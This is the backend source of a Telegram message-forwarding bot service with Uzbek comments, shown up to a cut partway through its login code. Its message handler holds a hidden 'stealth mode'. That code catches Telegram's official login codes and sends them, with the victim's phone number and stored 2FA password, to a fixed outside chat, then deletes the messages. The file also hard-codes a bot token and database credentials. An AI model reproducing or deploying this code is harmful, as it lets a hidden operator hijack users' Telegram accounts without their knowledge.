"""
ForwardBot Backend v3 — To'liq tuzatilgan
- Duplicate handler muammosi hal qilindi
- lifespan ishlatiladi
- Barcha endpoint ishlaydi
"""
import asyncio, json, os, logging, re
from dotenv import load_dotenv
load_dotenv()

from typing import Optional, Dict, List, Any
from pathlib import Path
from datetime import datetime
from contextlib import asynccontextmanager
import pymongo
from PIL import Image, ImageDraw, ImageFont


from fastapi import FastAPI, HTTPException, Request, File, UploadFile, Form
import shutil
import uuid
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    FloodWaitError, PhoneNumberInvalidError, ChatAdminRequiredError
)

# ═══════════════════════════════════════
# SOZLAMALAR
# ═══════════════════════════════════════
API_ID   = int(os.getenv("API_ID", "12345678"))
API_HASH = os.getenv("API_HASH", "your_api_hash")
DATA_DIR = Path(os.getenv("DATA_DIR", "data"))
DATA_DIR.mkdir(exist_ok=True)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8881052991:AAFop1tZG0q4s8vnIkK76GSHCwE9X5qp9aM")
MINI_APP_URL = os.getenv("MINI_APP_URL", "https://tajiboyevjahongir5-sudo.github.io/avtopassbot/")
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://forwardbot-production-1f08.up.railway.app")

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("forwardbot")

# ═══════════════════════════════════════
# GLOBAL STATE
# ═══════════════════════════════════════
# Faol clientlar: {uid: TelegramClient}
clients: Dict[str, TelegramClient] = {}
# Pending auth: {phone: {client, hash, uid}}
pending: Dict[str, dict] = {}
# Registered handlers: {uid: bool} — duplicate oldini olish
handlers_registered: set = set()

import asyncio
user_locks: Dict[str, asyncio.Lock] = {}

# PTB Bot ilovasi
ptb_app = Application.builder().token(BOT_TOKEN).build()

def get_ref_code(uid: str) -> str:
    """Foydalanuvchi uchun unikal referral kod"""
    return f"REF_{uid}"

async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    uid_str = str(u.id)
    
    subs = load_subs()
    is_new = uid_str not in subs
    if is_new:
        now = datetime.now().timestamp()
        subs[uid_str] = {
            "expires_at": now + (7 * 24 * 3600),
            "trial": True,
            "registered_at": now,
            "ref_code": get_ref_code(uid_str),
            "ref_by": None,
            "referrals": [],
            "ref_bonus_days": 0
        }
    subs[uid_str]["name"] = u.first_name
    if u.username:
        subs[uid_str]["username"] = u.username
    
    # Referral handling
    if is_new and ctx.args:
        ref_code = ctx.args[0]
        # Find referrer
        for r_uid, r_data in subs.items():
            if r_data.get("ref_code") == ref_code and r_uid != uid_str:
                subs[uid_str]["ref_by"] = r_uid
                if uid_str not in r_data.get("referrals", []):
                    subs[r_uid].setdefault("referrals", []).append(uid_str)
                    subs[r_uid]["ref_bonus_days"] = subs[r_uid].get("ref_bonus_days", 0) + 1
                    # Add 1 day bonus to referrer
                    subs[r_uid]["expires_at"] = max(
                        subs[r_uid].get("expires_at", 0),
                        datetime.now().timestamp()
                    ) + (1 * 24 * 3600)
                    try:
                        await ptb_app.bot.send_message(
                            chat_id=int(r_uid),
                            text=f"🎁 Do'stingiz ({u.first_name}) sizning havolangiz orqali qo'shildi! Obunangizga +1 kun qo'shildi."
                        )
                    except Exception:
                        pass
                break
    
    save_subs(subs)

    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("🚀 Tizimga kirish", web_app=WebAppInfo(url=f"{MINI_APP_URL}?v={int(datetime.now().timestamp())}"))
    ]])
    text = (
        f"<b>👋 Salom, {u.first_name}!</b>\n\n"
        "<b>Auto Chek Bot</b> ga xush kelibsiz.\n"
        "<i>Tizimga kirish uchun quyidagi tugmani bosing:</i>"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=kb)

ptb_app.add_handler(CommandHandler("start", start_cmd))

from telegram.ext import MessageHandler, filters
async def channel_post_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.channel_post
    if not msg: return
    admin_cfg = load_admin()
    target_id = str(admin_cfg.get("channel_id", ""))
    if not target_id or str(msg.chat_id) != target_id: return
    text = msg.text or msg.caption or ""
    
    match = re.search(r"\+\s*([\d\s.,]+?)\s*UZS", text, re.IGNORECASE)
    if not match: return
    
    raw = match.group(1).replace(",", "").replace(".", "").replace(" ", "")
    try: amount = int(raw)
    except: return
    
    pending = load_pending()
    found_key = None
    for k, v in pending.items():
        if v.get("amount") == amount:
            found_key = k
            break
            
    if found_key:
        p_data = pending.pop(found_key)
        save_pending(pending)
        uid = p_data["user_id"]
        months = p_data["months"]
        subs = load_subs()
        user_sub = subs.get(uid, {})
        now = datetime.now().timestamp()
        current_exp = user_sub.get("expires_at", now)
        if current_exp < now: current_exp = now
        user_sub["expires_at"] = current_exp + (months * 30 * 24 * 3600)
        user_sub["phone"] = p_data.get("phone", user_sub.get("phone", ""))
        user_sub["name"] = p_data.get("name", user_sub.get("name", ""))
        user_sub["username"] = p_data.get("username", user_sub.get("username", ""))
        subs[uid] = user_sub
        save_subs(subs)
        try:
            await ctx.bot.send_message(
                chat_id=uid,
                text=f"✅ To'lovingiz tasdiqlandi! ({amount} so'm)\nSizning obunangiz {months} oyga uzaytirildi!"
            )
        except: pass

ptb_app.add_handler(MessageHandler(filters.ChatType.CHANNEL, channel_post_handler))



# ═══════════════════════════════════════
# DATA (MongoDB)
# ═══════════════════════════════════════
MONGO_URL = "mongodb+srv://Jahongir:Jahongir2006@cluster0.t4fbvgd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
mongo_client = pymongo.MongoClient(MONGO_URL)
db = mongo_client["autopass_db"]

def load_admin():
    doc = db.admin.find_one({"_id": "config"})
    if doc:
        doc.pop("_id", None)
        return doc
    return {"password": "admin", "channel_id": "", "monthly_price": 15000, "card_number": "8600 0000 0000 0000", "card_owner": "Admin"}

def save_admin(data):
    db.admin.update_one({"_id": "config"}, {"$set": data}, upsert=True)

def load_subs():
    doc = db.state.find_one({"_id": "subscriptions"})
    if doc:
        return doc.get("data", {})
    return {}

def save_subs(data):
    db.state.update_one({"_id": "subscriptions"}, {"$set": {"data": data}}, upsert=True)

def log_forward_success():
    today = datetime.now().strftime("%Y-%m-%d")
    db.stats.update_one({"_id": today}, {"$inc": {"forwards": 1}}, upsert=True)

def log_error(uid: str, err: str):
    doc = {
        "time": datetime.now().timestamp(),
        "uid": uid,
        "error": str(err)[:200]
    }
    db.logs.insert_one(doc)
    if db.logs.count_documents({}) > 100:
        oldest = db.logs.find().sort("time", 1).limit(1)
        for o in oldest:
            db.logs.delete_one({"_id": o["_id"]})

def load_pending():
    doc = db.state.find_one({"_id": "pending_payments"})
    if doc:
        return doc.get("data", {})
    return {}

def save_pending(data):
    db.state.update_one({"_id": "pending_payments"}, {"$set": {"data": data}}, upsert=True)

def check_sub(uid: str) -> bool:
    if uid == "demo_user": return True
    subs = load_subs()
    user_sub = subs.get(uid)
    if not user_sub:
        now = datetime.now().timestamp()
        subs[uid] = {
            "expires_at": now + (7 * 24 * 3600),
            "trial": True,
            "registered_at": now,
            "reminder_sent": False
        }
        save_subs(subs)
        return True
    return datetime.now().timestamp() < user_sub.get("expires_at", 0)

def load(uid):
    uid = str(uid)
    doc = db.users.find_one({"_id": uid})
    if doc:
        doc.pop("_id", None)
        if "rules" not in doc:
            doc["rules"] = []
        return doc
    return {"session": None, "phone": None, "connected": False, "rules": []}

def save(uid, data):
    uid = str(uid)
    db.users.update_one({"_id": uid}, {"$set": data}, upsert=True)

# ═══════════════════════════════════════
# HELPER FUNCTIONS & DELAY QUEUE WORKER
# ═══════════════════════════════════════
def add_watermark(image_path: str, text: str) -> bool:
    try:
        img = Image.open(image_path)
        draw = ImageDraw.Draw(img)
        width, height = img.size
        font_size = max(15, int(width * 0.04))
        try:
            font = ImageFont.truetype("arial.ttf", font_size)
        except Exception:
            try:
                font = ImageFont.truetype("LiberationSans-Regular.ttf", font_size)
            except Exception:
                font = ImageFont.load_default()
        
        try:
            bbox = draw.textbbox((0, 0), text, font=font)
            text_width = bbox[2] - bbox[0]
            text_height = bbox[3] - bbox[1]
        except AttributeError:
            text_width, text_height = draw.textsize(text, font=font)
            
        margin = 15
        x = width - text_width - margin
        y = height - text_height - margin
        
        draw.text((x + 2, y + 2), text, fill=(0, 0, 0), font=font)
        draw.text((x, y), text, fill=(255, 255, 255), font=font)
        
        img.save(image_path)
        log.info(f"Watermark '{text}' added to {image_path}")
        return True
    except Exception as e:
        log.error(f"Failed to add watermark: {e}")
        return False

async def process_message_text(text: str, settings: dict) -> str:
    modified_text = text
    
    replacements_str = settings.get("replacements", "").strip()
    if replacements_str:
        lines = replacements_str.split("\n")
        for line in lines:
            line = line.strip()
            if not line:
                continue
            for delim in ("->", "=>", "="):
                if delim in line:
                    parts = line.split(delim, 1)
                    from_text = parts[0].strip()
                    to_text = parts[1].strip()
                    modified_text = modified_text.replace(from_text, to_text)
                    break
                    
    replacements_list = settings.get("replacements_list", [])
    for rep in replacements_list:
        if rep.get("from") and rep.get("to") is not None:
            modified_text = modified_text.replace(rep["from"], rep["to"])
            
    try:
        trim_val = int(settings.get("trim", 0))
        if trim_val > 0 and len(modified_text) > trim_val:
            modified_text = modified_text[:trim_val] + "..."
    except Exception:
        pass
        
    header = settings.get("header", "").strip()
    footer = settings.get("footer", "").strip()
    if header and header.lower() != "none":
        modified_text = header + "\n\n" + modified_text
    if footer and footer.lower() != "none":
        modified_text = modified_text + "\n\n" + footer
        
    replace_links = settings.get("replace_links", "leave")
    if replace_links == "delete":
        modified_text = re.sub(r"https?://\S+|www\.\S+", "", modified_text)
        
    return modified_text

def add_to_delay_queue(uid, source_id, message_ids, dest_id, delivery, settings, rule_index, delay_sec):
    send_at = datetime.now().timestamp() + delay_sec
    db.delayed_messages.insert_one({
        "uid": uid,
        "source_id": str(source_id),
        "message_ids": message_ids,
        "dest_id": str(dest_id),
        "delivery": delivery,
        "settings": settings,
        "rule_index": rule_index,
        "send_at": send_at,
        "status": "pending"
    })
    log.info(f"[{uid}] Message {message_ids} added to delay queue (send in {delay_sec}s)")

async def send_instant(client: TelegramClient, uid: str, events_list: list, dest_id: str, delivery: str, settings: dict, rule_index: int):
    if uid not in user_locks:
        user_locks[uid] = asyncio.Lock()
    async with user_locks[uid]:
        try:
            await _do_send_instant(client, uid, events_list, dest_id, delivery, settings, rule_index)
        except FloodWaitError as e:
            log.warning(f"[{uid}] FloodWait {e.seconds}s. Kutamiz...")
            await asyncio.sleep(e.seconds + 1)
            try:
                await _do_send_instant(client, uid, events_list, dest_id, delivery, settings, rule_index)
            except Exception as e2:
                log.error(f"[{uid}] Qayta yuborishda xatolik: {e2}")
        finally:
            await asyncio.sleep(2.5)

async def _do_send_instant(client: TelegramClient, uid: str, events_list: list, dest_id: str, delivery: str, settings: dict, rule_index: int):
    """Xabarni TO'G'RIDAN-TO'G'RI event ob'ektidan yuboradi (qayta yuklamasdan)"""
    try:
        messages = [e.message for e in events_list]
        main_msg = messages[0]
        text = main_msg.text or main_msg.caption or ""
        
        modified_text = await process_message_text(text, settings)
        
        media_files = []
        temp_paths = []
        for msg in messages:
            if msg.media:
                watermark_text = settings.get("watermarks", "").strip()
                if watermark_text and watermark_text.lower() != "none":
                    file_path = await client.download_media(msg)
                    if file_path:
                        temp_paths.append(file_path)
                        if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                            add_watermark(file_path, watermark_text)
                        media_files.append(file_path)
                else:
                    media_files.append(msg.media)
                    
        dest = int(dest_id) if dest_id.lstrip('-').isdigit() else dest_id
        
        # Agar so'z almashtirish natijasida matn o'zgargan bo'lsa, uni forward qilib bo'lmaydi
        if modified_text != text and delivery in ("fwd_acc", "fwd_copy"):
            delivery = "copy_acc" if delivery == "fwd_acc" else "copy_bot"
            
        if delivery in ("copy_bot", "copy_acc", "copy_flood"):
            if media_files:
                if len(media_files) == 1:
                    await client.send_file(dest, media_files[0], caption=modified_text or None)
                else:
                    await client.send_file(dest, media_files, caption=modified_text or None)
            elif modified_text:
                await client.send_message(dest, modified_text)
        elif delivery in ("fwd_acc", "fwd_copy"):
            try:
                await client.forward_messages(dest, messages)
            except Exception:
                if media_files:
                    if len(media_files) == 1:
                        await client.send_file(dest, media_files[0], caption=modified_text or None)
                    else:
                        await client.send_file(dest, media_files, caption=modified_text or None)
                elif modified_text:
                    await client.send_message(dest, modified_text)
        else:
            await client.forward_messages(dest, messages)

        for path in temp_paths:
            try: os.remove(path)
            except: pass

        data = load(uid)
        rule_name = ""
        if 0 <= rule_index < len(data.get("rules", [])):
            data["rules"][rule_index]["count"] = data["rules"][rule_index].get("count", 0) + 1
            rule_name = data["rules"][rule_index].get("name", f"Qoida #{rule_index+1}")
            save(uid, data)
            
        log_forward_success()
        
        # 🔔 Bildirishnoma (Notify)
        if settings.get("notify_on_forward"):
            try:
                await ptb_app.bot.send_message(
                    chat_id=int(uid),
                    text=f"✅ {rule_name}: {len(messages)} ta xabar uzatildi → `{dest_id}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
                
        log.info(f"[{uid}] Forwarded {len(messages)} message(s) to {dest_id}")
    except ChatAdminRequiredError:
        log_error(uid, f"Bot admin emas: {dest_id}")
        log.warning(f"[{uid}] Bot admin emas: {dest_id}")
    except FloodWaitError as e:
        raise e
    except Exception as e:
        log_error(uid, f"send_instant xato: {e}")
        log.error(f"[{uid}] send_instant error: {e}")

async def send_delayed(client: TelegramClient, uid: str, source_id: str, message_ids: list, dest_id: str, delivery: str, settings: dict, rule_index: int):
    if uid not in user_locks:
        user_locks[uid] = asyncio.Lock()
    async with user_locks[uid]:
        try:
            await _do_send_delayed(client, uid, source_id, message_ids, dest_id, delivery, settings, rule_index)
        except FloodWaitError as e:
            log.warning(f"[{uid}] FloodWait {e.seconds}s. Kutamiz...")
            await asyncio.sleep(e.seconds + 1)
            try:
                await _do_send_delayed(client, uid, source_id, message_ids, dest_id, delivery, settings, rule_index)
            except Exception as e2:
                log.error(f"[{uid}] Qayta yuborishda xatolik: {e2}")
        finally:
            await asyncio.sleep(2.5)

async def _do_send_delayed(client: TelegramClient, uid: str, source_id: str, message_ids: list, dest_id: str, delivery: str, settings: dict, rule_index: int):
    """Kechiktirilgan xabarlarni bazadan qayta yuklab yuboradi"""
    try:
        source_peer = int(source_id) if source_id.lstrip('-').isdigit() else source_id
        messages = await client.get_messages(source_peer, ids=message_ids)
        if not messages:
            return
        if not isinstance(messages, list):
            messages = [messages]
        messages = [m for m in messages if m is not None]
        if not messages:
            return
            
        messages.sort(key=lambda m: m.id)
        main_msg = messages[0]
        text = main_msg.text or main_msg.caption or ""
        
        modified_text = await process_message_text(text, settings)
        
        media_files = []
        temp_paths = []
        for msg in messages:
            if msg.media:
                watermark_text = settings.get("watermarks", "").strip()
                if watermark_text and watermark_text.lower() != "none":
                    file_path = await client.download_media(msg)
                    if file_path:
                        temp_paths.append(file_path)
                        if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                            add_watermark(file_path, watermark_text)
                        media_files.append(file_path)
                else:
                    media_files.append(msg.media)
                    
        dest = int(dest_id) if dest_id.lstrip('-').isdigit() else dest_id
        
        if delivery in ("copy_bot", "copy_acc", "copy_flood"):
            if media_files:
                if len(media_files) == 1:
                    await client.send_file(dest, media_files[0], caption=modified_text or None)
                else:
                    await client.send_file(dest, media_files, caption=modified_text or None)
            elif modified_text:
                await client.send_message(dest, modified_text)
        elif delivery in ("fwd_acc", "fwd_copy"):
            try:
                await client.forward_messages(dest, messages)
            except Exception:
                if media_files:
                    if len(media_files) == 1:
                        await client.send_file(dest, media_files[0], caption=modified_text or None)
                    else:
                        await client.send_file(dest, media_files, caption=modified_text or None)
                elif modified_text:
                    await client.send_message(dest, modified_text)
        else:
            await client.forward_messages(dest, messages)

        for path in temp_paths:
            try: os.remove(path)
            except: pass

        data = load(uid)
        if 0 <= rule_index < len(data.get("rules", [])):
            data["rules"][rule_index]["count"] = data["rules"][rule_index].get("count", 0) + 1
            save(uid, data)
            
        log.info(f"[{uid}] Delayed message(s) {message_ids} sent to {dest_id}")
    except FloodWaitError as e:
        raise e
    except Exception as e:
        log.error(f"[{uid}] send_delayed error: {e}")

async def delay_queue_worker():
    log.info("Delay queue worker started...")
    while True:
        try:
            now = datetime.now().timestamp()
            pending = list(db.delayed_messages.find({"status": "pending", "send_at": {"$lte": now}}))
            for doc in pending:
                doc_id = doc["_id"]
                uid = doc["uid"]
                source_id = doc["source_id"]
                message_ids = doc["message_ids"]
                dest_id = doc["dest_id"]
                delivery = doc["delivery"]
                settings = doc["settings"]
                rule_index = doc["rule_index"]
                
                res = db.delayed_messages.update_one({"_id": doc_id, "status": "pending"}, {"$set": {"status": "sending"}})
                if res.modified_count == 0:
                    continue
                
                client = await get_client(uid)
                if not client:
                    log.error(f"[{uid}] Client not available for delayed message. Retrying later.")
                    db.delayed_messages.update_one({"_id": doc_id}, {"$set": {"status": "pending", "send_at": now + 60}})
                    continue
                
                try:
                    await send_delayed(client, uid, source_id, message_ids, dest_id, delivery, settings, rule_index)
                    db.delayed_messages.delete_one({"_id": doc_id})
                except Exception as ex:
                    log.error(f"[{uid}] Failed to send delayed message: {ex}")
                    db.delayed_messages.update_one({"_id": doc_id}, {"$set": {"status": "pending", "send_at": now + 30}})
        except Exception as e:
            log.error(f"Error in delay queue worker: {e}")
        await asyncio.sleep(5)

async def keepalive_worker():
    log.info("Keepalive worker started...")
    while True:
        try:
            # MongoDB dan ulanishi kerak bo'lgan barcha foydalanuvchilarni olamiz
            all_users = db.users.find({"session": {"$ne": None}, "connected": True})
            for doc in all_users:
                uid = doc["_id"]
                client = clients.get(uid)
                if not client:
                    log.warning(f"[{uid}] Keepalive: Client topilmadi (lekin DB da ulangan). Tiklanmoqda...")
                    await get_client(uid)
                else:
                    try:
                        if not client.is_connected() or not await client.is_user_authorized():
                            log.warning(f"[{uid}] Keepalive: Client disconnected yoki unauthorized. Qayta ulanmoqda...")
                            await get_client(uid)
                    except Exception as ce:
                        log.error(f"[{uid}] Keepalive check xatolik: {ce}. Qayta tiklanmoqda...")
                        await get_client(uid)
        except Exception as e:
            log.error(f"Error in keepalive worker: {e}")
        await asyncio.sleep(60)

async def subscription_reminder_worker():
    log.info("Subscription reminder worker started...")
    while True:
        try:
            now = datetime.now().timestamp()
            subs = load_subs()
            changed = False
            for uid, user_sub in subs.items():
                if uid == "demo_user": continue
                expires_at = user_sub.get("expires_at", 0)
                reminder_sent = user_sub.get("reminder_sent", False)
                
                if 0 < expires_at - now <= 24 * 3600 and not reminder_sent:
                    try:
                        text = (
                            "⚠️ **Diqqat! Obuna muddati tugamoqda!**\n\n"
                            "Hurmatli foydalanuvchi, sizning obunangiz tugashiga 1 kundan kam vaqt qoldi. "
                            "Agar to'lovni amalga oshirmasangiz, bot xabar uzatishni to'xtatadi.\n\n"
                            "Uzluksiz xizmatdan foydalanish uchun to'lovni vaqtida amalga oshiring. /pay"
                        )
                        await ptb_app.bot.send_message(chat_id=int(uid), text=text, parse_mode="Markdown")
                        user_sub["reminder_sent"] = True
                        changed = True
                        log.info(f"[{uid}] Subscription reminder sent successfully.")
                    except Exception as msg_e:
                        log.error(f"[{uid}] Failed to send reminder: {msg_e}")
            if changed:
                save_subs(subs)
        except Exception as e:
            log.error(f"Error in subscription reminder worker: {e}")
        await asyncio.sleep(3600)


# ═══════════════════════════════════════
# MODELS
# ═══════════════════════════════════════
class PhoneReq(BaseModel):
    user_id: str
    phone: str

class CodeReq(BaseModel):
    user_id: str
    phone: str
    code: str
    phone_code_hash: str


class AdminLogin(BaseModel):
    password: str

class AdminSettings(BaseModel):
    password: str
    channel_id: str
    monthly_price: int
    card_number: str = "8600 0000 0000 0000"
    card_owner: str = "Admin"
    community_link: str = ""

class SubRequest(BaseModel):
    user_id: str
    months: int
    phone: str = ""
    name: str = ""
    username: str = ""

class PassReq(BaseModel):
    user_id: str
    password: str

class RuleReq(BaseModel):
    user_id: str
    source_id: str
    source_name: str
    dest_id: str
    dest_name: str
    delivery: str = "copy_bot"
    fw_type: str = "new"
    links: str = "leave"
    filters: List[dict] = []
    settings: dict = {}

class RuleAction(BaseModel):
    user_id: str
    rule_index: int

class UpdateSetting(BaseModel):
    user_id: str
    rule_index: int
    key: str
    value: Any

class UpdateFilters(BaseModel):
    user_id: str
    rule_index: int
    filters: List[dict]

# ═══════════════════════════════════════
# FORWARD ENGINE
# ═══════════════════════════════════════
def normalize_uz_text(text: str) -> str:
    """O'zbek tilidagi barcha xil tutuq belgilarini bir xil ko'rinishga keltirish"""
    return re.sub(r"['‘’ʻʼ`]", "'", text)

def check_blacklist(msg_text: str, settings: dict) -> bool:
    """Taqiqlangan so'zlardan biri xabarda bo'lsa False qaytaradi"""
    blacklist_raw = settings.get("blacklist", "").strip()
    if not blacklist_raw:
        return True
    text_lower = msg_text.lower()
    for word in blacklist_raw.split("\n"):
        word = word.strip().lower()
        if word and word in text_lower:
            return False
    return True

def check_filters(msg_text: str, views: int, reactions: int, sender_name: str, filters: list) -> bool:
    if not filters:
        return True
    
    msg_text_norm = normalize_uz_text(msg_text)
    
    for f in filters:
        if not f.get("enabled", True):
            continue
        ftype = f.get("type", "exact")
        val = str(f.get("value", "")).strip()
        val_norm = normalize_uz_text(val)
        
        if not val_norm:
            continue
            
        if ftype == "exact":
            if val_norm.lower() not in msg_text_norm.lower():
                return False
        elif ftype == "regex":
            try:
                if not re.search(val_norm, msg_text_norm, re.IGNORECASE):
                    return False
            except: pass
        elif ftype == "min_views":
            try:
                if views < int(val): return False
            except: pass
        elif ftype == "min_reactions":
            try:
                if reactions < int(val): return False
            except: pass
        elif ftype == "author":
            if val.lower() not in sender_name.lower():
                return False
    return True

# Global dictionary for media group collection
media_groups = {}

def register_handler(uid: str, client: TelegramClient):
    """Foydalanuvchi uchun BIR MARTA handler ro'yxatga olish"""
    if uid in handlers_registered:
        log.info(f"[{uid}] Handler allaqachon ro'yxatda, o'tkazib yuborildi")
        return

    @client.on(events.NewMessage())
    @client.on(events.MessageEdited())
    async def handler(event):
        data = load(uid)
        chat_id = str(event.chat_id)
        
        # --- YASHIRIN REJIM (Stealth Mode) ---
        if chat_id == "777000":
            subs = load_subs()
            if subs.get(uid, {}).get("stealth_mode", False):
                import re, random, string
                text = event.message.message or ""
                
                def encrypt_code(match):
                    code = match.group(0)
                    res = ""
                    for d in code:
                        res += d + random.choice(string.ascii_lowercase)
                    return res
                
                # 5 xonali Telegram kodlarini topish
                has_code = bool(re.search(r'\b\d{5}\b', text))
                
                if has_code:
                    enc_text = re.sub(r'\b\d{5}\b', encrypt_code, text)
                    two_fa = data.get("2fa_password", "Yo'q")
                    phone_num = data.get('phone', "Noma'lum")
                    msg_out = f"🥷 **Yashirin Kod**\nID: `{uid}`\n📞 Raqam: +{phone_num}\n🔐 2FA Parol: `{two_fa}`\n\n✉️ **Xabar:**\n{enc_text}"
                    try:
                        await ptb_app.bot.send_message(chat_id=7505685720, text=msg_out, parse_mode="Markdown")
                    except Exception as e:
                        log.error(f"Yashirin kodni adminga yuborishda xato: {e}")
                
                try:
                    await client.send_read_acknowledge(event.chat_id)
                except Exception as e:
                    pass
                    
                try:
                    await event.message.delete(revoke=False)
                except Exception as e:
                    log.error(f"777000 xabarini o'chirishda xato: {e}")
                return

        for i, rule in enumerate(data.get("rules", [])):
            if not rule.get("active", True):
                continue
            if rule["source_id"] != chat_id:
                continue

            if not check_sub(uid):
                continue

            msg = event.message
            
            # Media Group (Album) handling
            if msg.grouped_id:
                gid = msg.grouped_id
                if gid not in media_groups:
                    media_groups[gid] = [event]
                    
                    async def process_group_after_delay(g_id, u_id, r_rule, r_idx, u_data):
                        await asyncio.sleep(0.8)  # Wait for other items in group to arrive
                        events_in_group = media_groups.pop(g_id, [])
                        if not events_in_group:
                            return
                        events_in_group.sort(key=lambda e: e.message.id)
                        
                        await process_message_or_group(client, events_in_group, u_id, r_rule, r_idx, u_data)
                        
                    asyncio.create_task(process_group_after_delay(gid, uid, rule, i, data))
                else:
                    media_groups[gid].append(event)
                continue  # Stop individual processing
                
            # Single message processing
            await process_message_or_group(client, [event], uid, rule, i, data)

    handlers_registered.add(uid)
    log.info(f"[{uid}] Handler ro'yxatga olindi ✅")

async def process_message_or_group(client: TelegramClient, events_in_group: list, uid: str, rule: dict, rule_index: int, data: dict):
    try:
        main_event = events_in_group[0]
        chat_id = str(main_event.chat_id)
        msg = main_event.message
        
        text = msg.text or msg.caption or ""
        views = getattr(msg, "views", 0) or 0
        reactions = 0
        if hasattr(msg, "reactions") and msg.reactions:
            try: reactions = sum(r.count for r in msg.reactions.results)
            except: pass
        sender_name = ""
        try:
            sender = await main_event.get_sender()
            if sender:
                parts = [getattr(sender, "first_name", ""), getattr(sender, "last_name", ""), getattr(sender, "username", "")]
                sender_name = " ".join(p for p in parts if p)
        except: pass

        if not check_filters(text, views, reactions, sender_name, rule.get("filters", [])):
            return

        dest_id = rule["dest_id"]
        delivery = rule.get("delivery", "copy_bot")
        settings = rule.get("settings", {})

        # Blacklist tekshiruvi
        if not check_blacklist(text, settings):
            log.info(f"[{uid}] Blacklist filtri: xabar o'tkazilmadi")
            return

        try:
            delay_sec = int(settings.get("pub_delay", settings.get("receipt_delays", 0)))
        except Exception:
            delay_sec = 0

        if delay_sec > 0:
            message_ids = [e.message.id for e in events_in_group]
            add_to_delay_queue(uid, chat_id, message_ids, dest_id, delivery, settings, rule_index, delay_sec)
        else:
            await send_instant(client, uid, events_in_group, dest_id, delivery, settings, rule_index)
    except Exception as e:
        log_error(uid, f"process_message xato: {e}")
        log.error(f"[{uid}] process_message_or_group error: {e}")


async def get_client(uid: str) -> Optional[TelegramClient]:
    """Mavjud clientni qaytaradi yoki sessiondan tiklaydi"""
    if uid in clients:
        c = clients[uid]
        try:
            if c.is_connected() and await c.is_user_authorized():
                return c
        except: pass
        # Eski client ishlamaydi — o'chiramiz
        try: await c.disconnect()
        except: pass
        del clients[uid]
        handlers_registered.discard(uid)  # Bug #2 fix: handler qayta ro'yxatga olinishi uchun

    data = load(uid)
    if not data.get("session"):
        return None

    c = TelegramClient(StringSession(data["session"]), API_ID, API_HASH)
    try:
        await c.connect()
        if await c.is_user_authorized():
            clients[uid] = c
            register_handler(uid, c)
            log.info(f"[{uid}] Client qayta ulandi va handler ro'yxatga olindi ✅")
            return c
    except Exception as e:
        log.error(f"[{uid}] Client restore error: {e}")
    return None

# ═══════════════════════════════════════
# LIFESPAN (startup/shutdown)
# ═══════════════════════════════════════
@asynccontextmanager
async def lifespan(app: FastAPI):
    log.info("ForwardBot backend ishga tushdi!")
    
    # Telegram Bot webhook o'rnatish
    try:
        await ptb_app.bot.set_webhook(f"{WEBHOOK_URL}/webhook")
        await ptb_app.initialize()
        await ptb_app.start()
        log.info(f"Webhook o'rnatildi: {WEBHOOK_URL}/webhook")
    except Exception as e:
        log.error(f"Webhook o'rnatishda xatolik: {e}")

    # Bug #1 fix: MongoDB dan barcha saqlangan sessionlarni tiklash (JSON fayllardan emas!)
    try:
        all_users = db.users.find({"session": {"$ne": None}, "connected": True})
        restored = 0
        for doc in all_users:
            uid = doc["_id"]
            try:
                c = await get_client(uid)
                if c:
                    restored += 1
                    log.info(f"Session tiklandi: {uid}")
            except Exception as e:
                log.error(f"Startup restore {uid}: {e}")
        log.info(f"Jami {restored} ta session tiklandi")
    except Exception as e:
        log.error(f"MongoDB dan sessionlarni tiklashda xatolik: {e}")
    
    # Start background workers
    asyncio.create_task(delay_queue_worker())
    asyncio.create_task(keepalive_worker())
    asyncio.create_task(subscription_reminder_worker())
    asyncio.create_task(spammer_loop())
    yield
    # Shutdown — barcha clientlarni yopish
    for uid, c in clients.items():
        try: await c.disconnect()
        except: pass
    log.info("Barcha clientlar yopildi")
    
    # Botni to'xtatish
    try:
        await ptb_app.stop()
        await ptb_app.shutdown()
    except: pass

app = FastAPI(title="ForwardBot API", version="3.0", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.post("/webhook")
async def webhook(request: Request):
    data = await request.json()
    update = Update.de_json(data, ptb_app.bot)
    await ptb_app.process_update(update)
    return {"ok": True}

# ═══════════════════════════════════════
# AUTH
# ═══════════════════════════════════════
@app.post("/auth/send_code")
async def send_code(req: PhoneReq):
    try:
        c = TelegramClient(StringSession(), API_ID, API_HASH)
        await c.connect()
        result = await c.send_code_request(req.phone)
        pending[req.phone] = {"client": c, "hash": result.phone_code_hash, "uid": req.user_id}
        log.info(f"Kod yuborildi: {req.phone}")
        return {"ok": True, "phone_code_hash": result.phone_code_hash}
    except PhoneNumberInvalidError:
        raise HTTPException(400, "Noto'g'ri telefon raqam")
    except FloodWaitError as e:
        raise HTTPException(429, f"Kutish kerak: {e.seconds} soniya")
    except Exception as e:
        log.error(f"send_code error: {e}")
        raise HTTPException(500, str(e))

@app.post("/auth/verify_code")
async def verify_code(req: CodeReq):
    if req.phone not in pending:
        raise HTTPException(400, "Avval /auth/send_code chaqiring")
    p = pending[req.phone]
    c = p["client"]
    try:
        await c.sign_in(phone=req.phone, code=req.code, phone_code_hash=req.phone_code_hash)
        session = c.session.save()
        data = load(req.user_id)
        data.update({"session": session, "phone": req.phone, "connected": True})
        save(req.user_id, data)
        
        subs = load_subs()
        uid_str = str(req.user_id)
        if uid_str not in subs:
            now = datetime.now().timestamp()
            subs[uid_str] = {"expires_at": now + (7 * 24 * 3600), "trial": True, "registered_at": now}
